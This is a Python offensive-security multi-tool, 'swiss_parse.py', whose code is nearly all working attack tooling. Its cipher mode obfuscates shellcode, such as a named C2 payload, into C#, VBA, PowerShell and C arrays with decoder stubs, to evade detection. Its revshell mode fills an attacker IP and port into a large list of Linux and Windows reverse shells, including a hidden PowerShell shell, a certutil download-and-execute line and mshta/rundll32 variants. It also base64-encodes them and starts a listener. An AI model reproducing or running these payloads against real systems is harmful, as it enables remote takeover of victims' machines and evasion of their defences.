#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Made by papi
# Created on: Sat 30 Mar 2024 01:18:15 PM CET
# swiss_parse.py
# Description:
#  a swiss amy knife python script.
# Options:
#  - cipher -> Take a binary file run's basic cipher on it like xor and generate the decoder
#  - revshell -> Generate reverse shells in useful formats.
#  - sshdocker -> Ssh on to a machine get's the os version and generates a Dockerfile.
# Cipher:
#   Formats:
#    - cs -> C# buffer array
#    - vba -> vba for office suite
#    - ps -> powershell
#   Usage:
#    - python swiss_parse.py cipher -x 136 -c 5 -f ./file.bin -l cs -o /opt/windows/cs_bytecode.txt 2> /opt/windows/decrypt_code.cs
#    -> this command will produce a vba byte array with a cesar cypher of 5 and a xor of 136.
#    -> the decryption code will then need to be: buf(i) = buf(i) - 2
# Revshell:
#   Arguments:
#    - -i, --ip -> Your ip address
#    - -p, --port -> Your listening port
#    - -b, --base64 -> Base64 encode the revershell
#   Usage:
#    - python swiss_parse.py revshell -i 127.0.0.1 -p 1234 -b 2> list.txt
#    -> This command will produce a list of all of the reverse shell with the correct
#    -> ip and port and save them to list.txt while also displaying the base64 version of them.
# Sshdocker:
#   Distribution:
#    - ubuntu
#    - debian
#    - opensuse-leap
#    - fedora
#    - alpine
#   Usage:
#    - python swiss_parse.py sshdocker -i 127.0.0.1 -u root -p toor 2> Dockerfile
#    -> This command will create a Dockerfile with the OS matching what is on the
#    -> ip address provided.

import getopt, sys, base64
import os, time

def usage():
    print(f"{sys.argv[0]}: Python swiss army knife for various tasks")
    print("\x1b[1;35m          ⣀⣀⡀                 \x1b[0m")
    print("\x1b[1;35m  ⢠⡄      ⢿⡿⠿⠿⠶⣦⣄⣀            \x1b[0m")
    print("\x1b[1;35m  ⢼⣿⣆        ⣤⣀⣈⣿⣿⡿⠂⣀⣀⣀⠀      \x1b[0m")
    print("\x1b[1;35m  ⢸⡟⣿⡆       ⠈⠙⠿⡿⠋⣠⡾⢿⡿⢿⣷⡄     \x1b[0m")
    print("\x1b[1;35m   ⣇⢸⣿          ⣠⣾⣿⡷⠀⠀⢾⣿⡇     \x1b[0m")
    print("\x1b[1;35m   ⢹⣿⣿⣧        ⣾⣿⣿⣿⣷⣾⣷⡾⠋⣀     \x1b[0m")
    print("\x1b[1;35m   ⠈⣿⣿⣿     ⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋⠠⣾⣿⣇    \x1b[0m")
    print("\x1b[1;35m    ⢿⣿⣿⣿  ⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋   ⢼⣿⣿    \x1b[0m")
    print("\x1b[1;35m    ⠸⣿⡿⠋⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋     ⠠⣿⣿⣇   \x1b[0m")
    print("\x1b[1;35m     ⠉⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋        ⢾⣿⣿   \x1b[0m")
    print("\x1b[1;35m     ⢸⣿⣿⣿⣿⣿⣿⡿⠋          ⠰⢿⣿⣧  \x1b[0m")
    print("\x1b[1;35m     ⠘⢿⣿⣿⣿⡿⠋⠀            ⠸⠟⠋  \x1b[0m")
    print("\x1b[1;35m    ⢀⣠⣤⡉⠉⠉                    \x1b[0m")
    print("\x1b[1;35m  ⣀⠴⠛⠉                        \x1b[0m")
    print("\x1b[1;35m                              \x1b[0m")
    print()
    Cipher().usage()
    print()
    Revshell().usage()
    print()
    Sshdocker().usage()

class Cipher:
    CS_SNIPPET_DECODE_CESAR='''byte[] buf = new byte[enc.Length];
for (int i = 0; i < enc.Length; i++) {
    buf[i] = (byte)(((uint)enc[i] - %d) & 0xFF);
}'''
    CS_SNIPPET_DECODE_XOR='''for (int i = 0; i < enc.Length; i++) {
    enc[i] = enc[i] ^ %d;
}'''
    VBA_SNIPPER_DECODE_CESAR='''Dim counter As Long
Dim data As Long
For counter = LBound(buf) To UBound(buf)
    data = buf(counter) - %d
    Rem put here the code to move in memory or save to new array ^^
Next counter'''
    PS_SNIPPER_DECODE_CESAR='''for($index = 0; $index -lt $buf.count; $index++) {
    $buf[$index] = $buf[$index] - %d
}'''
    C_SNIPPET_DECODE_CESAR='''for (unsigned int i = 0; i < sizeof(buf); i++) {
    buf[i] = buf[i] - %d;
}'''
    C_SNIPPET_DECODE_XOR='''for (unsigned int i = 0; i < sizeof(buf); i++) {
    buf[i] = buf[i] ^ %d;
}'''
    C_SNIPPET_DECODE_XOR_ANNOYING='''for (unsigned int i = 0; i < sizeof(buf); i++) {
    buf[i] = buf[i] ^ (%d + i);
}'''
    C_SNIPPET_DECODE_XOR_KEY='''unsigned char\tkey[] = "%s";
for (unsigned int i = 0, j=0; i < sizeof(buf); i++, j++) {
    if (j >= (sizeof(key) - 1)) {
        j = 0;
    }
    buf[i] = buf[i] ^ key[j];
}'''
    def __init__(self):
        self.supported_languages = ("vba", "c", "ps", "cs", "c-str", "raw")
        self.language = None
        self.file = None
        self.out_file = ""
        self.cesar = 0
        self.xor = -1
        self.annoyingxor = False
        self.string = ""
        self.xorKey = None
        self.rc4Key = None

    @classmethod
    def parse_args(cls, argv):
        instance=cls()
        try:
            opts, args = getopt.getopt(argv, "hal:f:s:c:o:x:p:z:r:",
                                       ["help", "annoyingxor", "lang=", "file=",
                                        "string=", "cesar=", "output=", "xor=",
                                        "powershellencode=", "xorKey=", "rc4="])
        except getopt.GetoptError as err:
            print(err)
            usage()
            sys.exit(-1)
        for o, a in opts:
            if o in ("-h", "--help"):
                instance.usage()
                sys.exit()
            elif o in ("-l", "--lang"):
                instance.language = a
            elif o in ("-f", "--file"):
                instance.file = a
            elif o in ("-c", "--cesar"):
                instance.cesar = int(a)
            elif o in ("-a", "--annoyingxor"):
                instance.annoyingxor = True
            elif o in ("-x", "--xor"):
                instance.xor = int(a)
            elif o in ("-z", "--xorKey"):
                instance.xorKey = a
            elif o in ("-o", "--output"):
                instance.out_file = a
            elif o in ("-s", "--string"):
                instance.string = a
            elif o in ("-r", "--rc4"):
                instance.rc4Key= a
            elif o in ("-p", "--powershellencode"):
                print("\x1b[1;31m[!] Powershell b64 data:\x1b[0m")
                print(base64.b64encode(a.encode('utf16')[2:]).decode())
                sys.exit(0)
            else:
                usage()
                sys.exit(-1)
        if instance.language not in instance.supported_languages:
            print("The provided language: %s is not supported" % instance.language)
            sys.exit(-1)
        if len(instance.string) == 0 and instance.file == None:
            print("Please provide a string to encrypt with `-s` or a file with `-f`")
            sys.exit(-1)
        else:
            if instance.file != None and not os.path.exists(instance.file):
                print("Could not fine the file provided: %s" % instance.file)
                sys.exit(-1)
        return instance

    def usage(self):
        print("\x1b[1;32mcipher:\x1b[0m")
        print("A tool to take a .bin file and display it in")
        print("different formats with reversible encryption techniques.")
        print("Usage:")
        print("\t-h --help\tThis current output.")
        print("\t-p --powershellencode\tPowershell base64 encryptor")
        print("\t-l --lang=\tLanguage format for the output (cs, ps, vba).")
        print("\t-s --string=\tThe string to encrypt.")
        print("\t-f --file=\tThe file to read from.")
        print("\t-o --output=\tThe output file to write the byte code too. Can be (-) for stdout.")
        print("\t-c --cesar=\tThe increment for the cesar cypher (Default: 0).")
        print("\t-x --xor=\tThe increment for the xor cypher.")
        print("\t-r --rc4=\tThe increment for the rc4 cypher.")
        print("\t-z --xorKey\tThe key to use on the alrogrithm (XOR)")
        print("\t-a --annoyingxor\tImplementation of annoying xort.")
        print("Example:")
        print(f"\t$ python {sys.argv[0]} cipher -o - -l cs -f ~/payload/demon.x64.bin -c 2")
        print("\t\x1b[1;31m[!] Saving the encoded data to the specified file\x1b[0m")
        print("\tbyte[] buf = new byte[] {")
        print("\t    0xfe, 0x4a, 0x54, ...")
        print("\t}")
        print("\t\x1b[1;31m[!] The payload decoder sample:\x1b[0m")
        print("\tfor (int i = 0; i < buf.Length; i++) {")
        print("\t    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF")
        print("\t}")

    def _display_byte(self, byte, pos):
        '''
        [int] -> byte
        [int] -> pos
        Return -> [char]
        '''
        char = ''
        if self.language == 'vba':
            char = "%d, " % (byte)
            if pos % 20 == 0:
                char += "_\n"
        elif self.language == 'c':
            char = "0x%x, " % (byte)
            if pos % 20 == 0:
                char += "\n\t"
        elif self.language == 'c-str':
            char = "\\x%x" % (byte)
            if pos % 20 == 0:
                char += "\"\n\t\""
        elif self.language == 'cs' or self.language == 'ps':
            char = "0x%x, " % (byte)
            if pos % 20 == 0 and self.language != 'ps':
                char += "\n\t"
        elif self.language == 'raw':
            return byte
        return char

    def _rc4(self, key, data):
        # Key Scheduling Algorithm (KSA)
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + ord(key[i % len(key)])) % 256
            S[i], S[j] = S[j], S[i]
        # Pseudo-Random Generation Algorithm (PRGA)
        i = j = 0
        result = []
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result.append(byte ^ S[(S[i] + S[j]) % 256])
        return bytes(result)

    def _encode_byte(self, byte, counter):
        val = (int.from_bytes(byte,byteorder='big') + self.cesar)
        if self.xor != -1 or self.xorKey != None:
            if self.annoyingxor:
                val = val ^ (self.xor + counter)
            elif self.xorKey != None:
                val = val ^ ord(self.xorKey[counter % len(self.xorKey)])
            else:
                val = val ^ self.xor
        return val & 0xFF

    def _encoder(self, data_stream):
        pos = 0
        encrypted_value = ""
        if self.rc4Key != None:
            data_stream = self._rc4(self.rc4Key, data_stream)
        if self.language == 'raw':
            return bytearray(self._encode_byte(data_stream[pos:pos+1], pos)
                             for pos in range(len(data_stream)))
        while pos < len(data_stream):
            encrypted_value += self._display_byte(self._encode_byte(data_stream[pos:pos+1], pos), pos + 1)
            pos +=1
        if self.language in ('cs', 'ps', 'vba', 'c'): # handle the case where some languages add ", "
            return encrypted_value[:-2]
        else:
            return encrypted_value

    def _load_data(self):
        if self.file is not None:
            with open(self.file, "rb") as fp:
                return fp.read()
        elif self.string:
            return self.string.encode()

    def _save_stream(self, data_stream):
        if self.out_file == '-':
            if self.language == 'cs':
                print("int[] enc = new int[] {\n\t%s\n};" % data_stream, file=sys.stderr)
            elif self.language == 'c':
                print("unsigned char buf[] = {\n\t%s\n};" % data_stream, file=sys.stderr)
            elif self.language == 'c-str':
                print("unsigned char buf[] = \"%s\";" % data_stream, file=sys.stderr)
            elif self.language == 'ps':
                print("[Byte[]] $buf = %s" % data_stream, file=sys.stderr)
            elif self.language == 'vba':
                print("buf = Array(%s)" % data_stream, file=sys.stderr)
            elif self.language == 'raw':
                sys.stderr.buffer.write(data_stream)
        else:
            if self.language == 'raw':
                with open(self.out_file, "wb") as fp:
                    fp.write(data_stream)
            else:
                with open(self.out_file, "w") as fp:
                    if self.language == 'cs':
                        fp.write("int[] enc = new int[] {\n\t%s\n};" % data_stream)
                    elif self.language == 'c':
                        fp.write("unsigned char buf[] =  \"%s\";" % data_stream)
                    elif self.language == 'ps':
                        fp.write("[Byte[]] $buf = %s" % data_stream)
                    elif self.language == 'vba':
                        fp.write("buf = Array(%s)" % data_stream)

    def _show_decoder(self):
        if self.language == 'c':
            if self.xor != -1 or self.xorKey != None:
                if self.annoyingxor:
                    print(Cipher.C_SNIPPET_DECODE_XOR_ANNOYING % self.xor, file=sys.stderr)
                elif self.xorKey  != None:
                    print(Cipher.C_SNIPPET_DECODE_XOR_KEY  % self.xorKey, file=sys.stderr)
                else:
                    print(Cipher.C_SNIPPET_DECODE_XOR % self.xor, file=sys.stderr)
            if self.cesar != 0:
                print(Cipher.C_SNIPPET_DECODE_CESAR % self.cesar, file=sys.stderr)
        if self.language == 'cs':
            if self.xor != -1:
                print(Cipher.CS_SNIPPET_DECODE_XOR % self.xor, file=sys.stderr)
            if self.cesar != 0:
                print(Cipher.CS_SNIPPET_DECODE_CESAR % self.cesar, file=sys.stderr)
        if self.language == 'vba' and self.cesar != 0:
            print(Cipher.VBA_SNIPPER_DECODE_CESAR % self.cesar, file=sys.stderr)
        if self.language == 'ps' and self.cesar != 0:
            print(Cipher.PS_SNIPPER_DECODE_CESAR % self.cesar, file=sys.stderr)

    def run(self):
        print("\x1b[1;31m[!] Encoding the data...\x1b[0m")
        data = self._load_data()
        encoded_data = self._encoder(data)
        print("\x1b[1;31m[!] Saving the encoded data to the specified file\x1b[0m")
        self._save_stream(encoded_data)
        print("\x1b[1;31m[!] The payload decoder sample:\x1b[0m")
        self._show_decoder()

class Revshell:

    LINUX_REVSHELLS = [
        "sh -i >& /dev/tcp/%s/%d 0>&1", "0<&196;exec 196<>/dev/tcp/%s/%d; sh <&196 >&196 2>&196",
        "bash -i >& /dev/tcp/%s/%d 0>&1", "0<&196;exec 196<>/dev/tcp/%s/%d; bash <&196 >&196 2>&196",
        "exec 5<>/dev/tcp/%s/%d;cat <&5 | while read line; do $line 2>&5 >&5; done",
        "sh -i 5<> /dev/tcp/%s/%d 0<&5 1>&5 2>&5", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %d >/tmp/f",
        "bash -i 5<> /dev/tcp/%s/%d 0<&5 1>&5 2>&5", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc %s %d >/tmp/f",
        "xterm -display %s:%d",
        "busybox nc %s %d -e sh", "nc -c sh %s %d", "nc %s %d -e sh",
        "C=\'curl -Ns telnet://%s:%d\'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null",
        "mkfifo /tmp/s; sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect %s:%d > /tmp/s; rm /tmp/s",
        "php -r \'$sock=fsockopen(\"%s\",%d);exec(\"sh <&3 >&3 2>&3\");\'",
        "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\'",
        "python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%d));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")\'",
        "python3 -c \'import os,pty,socket;s=socket.socket();s.connect((\"%s\",%d));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")\'",
        "ruby -rsocket -e\'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))\'",
        "ruby -rsocket -e\'exit if fork;c=TCPSocket.new(\"%s\",\"%d\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}\'",
        "sqlite3 /dev/null \'.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc %s %d >/tmp/f\'",
        "zsh -c \'zmodload zsh/net/tcp && ztcp %s %d && zsh >&$REPLY 2>&$REPLY 0>&$REPLY\'",
        "awk \'BEGIN {s = \"/inet/tcp/0/%s/%d\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}\' /dev/null"
    ]
    WINDOWS_REVSHELLS = [
        "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
        "powershell -nop -W hidden -noni -ep bypass -c \"$client = New-Object System.Net.Sockets.TCPClient('%s',%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
        "cmd.exe /c \"powershell -nop -ep bypass -c '$client=New-Object Net.Sockets.TCPClient(\"%s\",%d);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $data 2>&1|Out-String);$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$sb3=([Text.Encoding]::ASCII).GetBytes($sb2);$stream.Write($sb3,0,$sb3.Length);$stream.Flush()};$client.Close()'\"",
        "certutil.exe -urlcache -split -f http://%s:%d/shell.exe C:\\Windows\\Temp\\shell.exe && C:\\Windows\\Temp\\shell.exe",
        "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell -nop -ep bypass -c $client=New-Object Net.Sockets.TCPClient('%s',%d)\"\",,False:close\")",
        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new%%20ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -ep bypass -c $client=New-Object Net.Sockets.TCPClient('%s',%d)\");",
        "nc.exe %s %d -e cmd.exe",
        "nc.exe -e cmd.exe %s %d"
    ]
    def __init__(self):
        self.ip = ""
        self.port = 0
        self.x11 = False
        self.listen = False
        self.b64= False
        self.linux = False
        self.windows = False

    @classmethod
    def parse_args(cls, argv):
        instance = cls()
        try:
            opts, args = getopt.getopt(argv, "hbxlLWi:p:",
                                       ["help", "base64", "x11", "listen",
                                        "linux", "windows", "ip=", "port="])
        except getopt.GetoptError as err:
            print(err)
            usage()
            sys.exit(-1)
        for o, a in opts:
            if o in ("-h", "--help"):
                instance.usage()
                sys.exit()
            elif o in ("-i", "--ip"):
                instance.ip = a
            elif o in ("-p", "--port"):
                instance.port = int(a)
            elif o in ("-b", "--base64"):
                instance.b64 = True
            elif o in ("-l", "--listen"):
                instance.listen = True
            elif o in ("-L", "--linux"):
                instance.linux = True
            elif o in ("-W", "--windows"):
                instance.windows = True
            elif o in ("-x", "--x11"):
                instance.x11 = True
            else:
                usage()
                sys.exit(-1)
        return instance

    def usage(self):
        print("\x1b[1;32mrevshell:\x1b[0m")
        print("A tool that will give you multiple reverse shells in useful formats")
        print("Usage:")
        print("\t-i --ip\t\tThe ip address of the attacker")
        print("\t-p --port\tThe port of the attacker")
        print("\t-b --base64\tEncode it all in base64")
        print("\t-l --listen\tStart a netcat listener")
        print("\t-L --linux\tOnly show linux revshells")
        print("\t-W --windows\tOnly show windows revshells")
        print("\t-x --x11\tStart a X11 listener")
        print("Example:")
        print(f"\t$ python {sys.argv[0]} revshell -i 127.0.0.1 -p 1234 -b")
        print("\t\x1b[1;31m[!] The revshells:\x1b[0m")
        print("\tsh -i >& /dev/tcp/127.0.0.1/1234 0>&1")
        print("\tb'c2ggLWkgPiYgL2Rldi90Y3AvJXMvJWQgMD4mMQ=='")
        print("\t...")
        print("\t\x1b[1;31m[!] Decode the base64:\x1b[0m")
        print("\techo <b64> | base64 -d | bash")
        print("\t\x1b[1;31m[!] Started ncat listener on 1234:\x1b[0m")
        print("\tListening on 0.0.0.0 1234")

    def _show_linux(self):
        for shell in Revshell.LINUX_REVSHELLS:
            data = shell % (self.ip, self.port)
            print(data, file=sys.stderr)
            if self.b64:
                print(base64.b64encode(data.encode('UTF-8')))

    def _show_windows(self):
        for shell in Revshell.WINDOWS_REVSHELLS:
            data = shell % (self.ip, self.port)
            print(data, file=sys.stderr)
            if self.b64:
                print(base64.b64encode(data.encode('UTF-8')))

    def run(self):
        print("\x1b[1;31m[!] The revshells:\x1b[0m")
        if self.windows == True and self.linux == False:
            self._show_windows()
            if self.b64:
                print("\x1b[1;31m[!] Decode the base64:\x1b[0m")
                print("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('<b64>'))")
        elif self.windows == False and self.linux == True:
            self._show_linux()
            if self.b64:
                print("\x1b[1;31m[!] Decode the base64:\x1b[0m")
                print("echo <b64> | base64 -d | bash")
        else:
            self._show_linux()
            self._show_windows()
            if self.b64:
                print("\x1b[1;31m[!] Decode the base64:\x1b[0m")
                print("echo <b64> | base64 -d | bash")
                print("[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('<b64>'))")
        if self.listen:
            print("\x1b[1;31m[!] Started ncat listener on %d\x1b[0m" % self.port)
            os.system("nc -lvp %d" % self.port)
        if self.x11:
            print("\x1b[1;34m[*] Don't forget to add the victim to xhost with\x1b[0m: xhost +target.ip")
            print("\x1b[1;31m[!] Started xnest listener on %d\x1b[0m" % self.port)
            os.system("Xnest :%d" % self.port)

class Sshdocker:
    DISTRO_MAP = {
        "ubuntu": {
            "image": lambda v: f"ubuntu:{v}",
            "packages": "apt update && apt install -y build-essential git python3 util-linux xfsprogs e2fsprogs squashfs-tools"
        },
        "debian": {
            "image": lambda v: f"debian:{v}",
            "packages": "apt update && apt install -y build-essential git python3 util-linux xfsprogs e2fsprogs squashfs-tools"
        },
        "opensuse-leap": {
            "image": lambda v: f"opensuse/leap:{v}",
            "packages": "zypper refresh && zypper install -y gcc make git python3 glibc-devel util-linux xfsprogs e2fsprogs"
        },
        "fedora": {
            "image": lambda v: f"fedora:{v}",
            "packages": "dnf install -y gcc make git python3 glibc-devel util-linux xfsprogs e2fsprogs squashfs-tools"
        },
        "alpine": {
            "image": lambda v: f"alpine:{v}",
            "packages": "apk add --no-cache build-base gcc make musl-dev make git python3 util-linux xfsprogs e2fsprogs squashfs-tools"
        }
    }
    def __init__(self):
        self.keep_alive = False
        self.ip = None
        self.port = 22
        self.username = None
        self.password = None
        self.ssh_key_file = None
        self.generate_docker = None

    @classmethod
    def parse_args(cls, argv):
        instance = cls()
        try:
            opts, args = getopt.getopt(argv, "hag:i:n:u:p:k:",
                                       ["help", "alive", "generate", "ip",
                                        "port", "username", "password", "key"])
        except getopt.GetoptError as err:
            print(err)
            usage()
            sys.exit(-1)
        for o, a in opts:
            if o in ("-h", "--help"):
                instance.usage()
                sys.exit()
            elif o in ("-i", "--ip"):
               instance.ip = a
            elif o in ("-n", "--port"):
               instance.port = int(a)
            elif o in ("-u", "--username"):
               instance.username = a
            elif o in ("-p", "--password"):
                instance.password = a
            elif o in ("-g", "--generate"):
                instance.generate_docker = a
            elif o in ("-k", "--key"):
                instance.ssh_key_file = a
            elif o in ("-a", "--alive"):
               instance.keep_alive = True
            else:
                usage()
                sys.exit(-1)
        return instance

    def usage(self):
        print("\x1b[1;32msshdocker:\x1b[0m")
        print("A tool that will ssh on a machine get it's os version and create a dockerfile with the matching OS")
        print("Usage:")
        print("\t-i --ip\t\tThe host to ssh on")
        print("\t-n --port\tThe port of the attacker")
        print("\t-u --username\tThe username to use")
        print("\t-k --key\tThe ssh keyfile")
        print("\t-p --password\tThe password to the username/The password to the keyfile")
        print("\t-a --alive\tKeep the ssh connection alive.")
        print("\t-g --generate\tGenerate a Dockerfile from the provided distro name to the latest version.")
        print("Available Distros:")
        print("\tubuntu,debian,opensuse-leap,fedora,alpine")
        print("Example:")
        print(f"\t$ python {sys.argv[0]} sshdocker -i 127.0.0.1 -u root -p toor")
        print("\t\x1b[1;31m[!] Starting the ssh connection:\x1b[0m")
        print("\tcat /etc/os-release")
        print("\tNAME=\"openSUSE Leap\"")
        print("\tVERSION_ID=\"15.6\"")
        print("\tID=\"opensuse-leap\"")
        print("\t...")
        print("\t\x1b[1;31m[!] Generating the Dockerfile\x1b[0m")
        print("\tFROM opensuse/leap:15.6")
        print("\tRUN zypper refresh && zypper install -y gcc make git python3 glibc-devel util-linux xfsprogs e2fsprogs squashfs-tools")
        print("\tWORKDIR /work")
        print("\tCMD [\"/bin/bash\"]")

    def _parse_env(self, text: str) -> dict: #thx chatgpt
        data = {}
        for line in text.splitlines():
            line = line.strip()
            # Skip empty lines
            if not line:
                continue
            # Skip malformed lines
            if "=" not in line:
                continue
            key, value = line.split("=", 1)
            # Remove quotes if present
            value = value.strip().strip('"')
            data[key] = value
        return data


    def _ssh_session(self):
        try:
            import paramiko
        except ImportError:
            print("\x1b[1;31m[!] This feature needs paramiko please install it.\x1b[0m")
            sys.exit(-1)
        meta_data = {
            "os-release": None
        }
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if self.ssh_key_file:
            ssh.connect(hostname=self.ip, port=self.port, username=self.username, key_filename=self.ssh_key_file,
                        password=self.password)
        else:
            ssh.connect(hostname=self.ip, port=self.port, username=self.username, password=self.password)
        print("$ cat /etc/os-release")
        stdin, stdout, stderr = ssh.exec_command("cat /etc/os-release")
        output = stdout.read().decode()
        error = stderr.read().decode()
        if len(error) != 0:
            print("\x1b[1;31m[!] Failed to execute command:\x1b[0m")
            print(error)
            ssh.close()
            return None, None
        print(output)
        res = self._parse_env(output)
        meta_data["os-release"] = res
        return ssh, meta_data

    def _stay_alive(self, ssh):
        chan = ssh.invoke_shell()
        print("\x1b[1;31m[!] Staying alive!!!!!\x1b[0m")
        print("Type 'exit' to quit.")
        chan.send("stty -echo\n") # this will remove the command echo
        time.sleep(0.3)
        while True:
            output = chan.recv(9999).decode(errors="ignore")
            print(output, end="")
            cmd = input('')
            if cmd.strip() in ("exit", "quit"):
                break
            chan.send(cmd + "\n")
            time.sleep(0.3)
        chan.close()

    def _parse_to_docker(self, meta_data):
        if self.generate_docker:
            print("FROM %s" % Sshdocker.DISTRO_MAP[self.generate_docker]["image"]("latest"), file=sys.stderr)
            print("RUN %s" % Sshdocker.DISTRO_MAP[self.generate_docker]["packages"], file=sys.stderr)
            print("WORKDIR /work", file=sys.stderr)
            print("CMD [\"/bin/bash\"]", file=sys.stderr)
        else:
            print("FROM %s" % Sshdocker.DISTRO_MAP[meta_data["os-release"]["ID"]]["image"](meta_data["os-release"]["VERSION_ID"]), file=sys.stderr)
            print("RUN %s" % Sshdocker.DISTRO_MAP[meta_data["os-release"]["ID"]]["packages"], file=sys.stderr)
            print("WORKDIR /work", file=sys.stderr)
            print("CMD [\"/bin/bash\"]", file=sys.stderr)

    def run(self):
        if (self.ip and self.username and (self.password or self.ssh_key_file)):
            print("\x1b[1;31m[!] Starting the ssh connection\x1b[0m")
            ssh, meta_data = self._ssh_session()
            if meta_data:
                print("\x1b[1;31m[!] Generating the Dockerfile\x1b[0m")
                self._parse_to_docker(meta_data)
                print("\x1b[1;32m[*] If build of the image does not exist\x1b[0m")
                print("Change %s to latest" % meta_data["os-release"]["VERSION_ID"])
                print("\x1b[1;31m[!] Execute with the following:\x1b[0m")
                print("sudo docker build -t exploit-env .")
                print("sudo docker run --rm --privileged -v \"$PWD\":/work -it exploit-env")
                if ssh and self.keep_alive:
                    self._stay_alive(ssh)
                    ssh.close()
        elif self.generate_docker:
            print("\x1b[1;31m[!] Generating the Dockerfile\x1b[0m")
            self._parse_to_docker(None)
        else:
            print("python %s -i <ip.addr> -u <username> -p <password> -k <keyfile>" % sys.argv[0])
            sys.exit(-1)


if __name__ == "__main__":
    if sys.argv[1] == "cipher":
        Cipher.parse_args(sys.argv[2:]).run()
    elif sys.argv[1] == "revshell":
        Revshell.parse_args(sys.argv[2:]).run()
    elif sys.argv[1] == "sshdocker":
        Sshdocker.parse_args(sys.argv[2:]).run()
    else:
        usage()
        sys.exit(-1)
